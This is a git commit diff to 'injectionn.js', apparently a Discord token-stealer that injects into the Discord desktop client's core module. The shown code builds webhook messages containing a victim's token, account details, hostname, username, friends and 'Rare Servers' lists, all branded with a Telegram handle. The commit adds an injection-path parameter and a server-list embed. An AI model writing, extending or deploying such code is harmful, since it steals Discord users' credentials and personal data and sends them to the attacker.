defc4a1efd68fb654f8d8f0fd0c49e51585cb54b
undefinedsource338 <hairo49@yandex.com>
2025-10-19 15:02:28 +0300

    Update injectionn.js

--- injectionn.js
+++ injectionn.js
@@ -153,7 +153,7 @@ const request = async (method, url, headers, data) => {
     });
 };
 
-const hooker = async (content, token, account) => {
+const hooker = async (content, token, account, injectionPath = null) => {
     content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
     content["username"] = "https://t.me/hairo13x7";
     content["avatar_url"] = "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&";
@@ -186,8 +186,8 @@ const hooker = async (content, token, account) => {
     ];
     
     // Injection path'i ekle
-    const injectionPath = `C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Discord\\app-1.0.9212\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
-    additionalFields.push({ name: `<:space_classic:1429086519901032610> Path:`, value: `\`${injectionPath}\``, inline: false });
+    const pathToShow = injectionPath || `C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Discord\\app-1.0.9212\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
+    additionalFields.push({ name: `<:space_classic:1429086519901032610> Path:`, value: `\`${pathToShow}\``, inline: false });
     
     content["embeds"][0]["fields"] = [...originalFields, ...additionalFields];
     content["embeds"][0]["color"] = 0x313338;
@@ -199,6 +199,11 @@ const hooker = async (content, token, account) => {
         color: 0x313338,
         description: friends.message,
         author: { name: `HQ Friends (${friends.totalFriends})`, icon_url: "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&" },
+        footer: { text: `${os.userInfo().username} | https://t.me/hairo13x7`, icon_url: "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&" },
+    }, {
+        color: 0x313338,
+        description: servers.message,
+        author: { name: `Rare Servers (${servers.totalGuilds})`, icon_url: "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&" },
         footer: { text: `${os.userInfo().username} | https://t.me/hairo13x7`, icon_url: "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&" },
     });
 
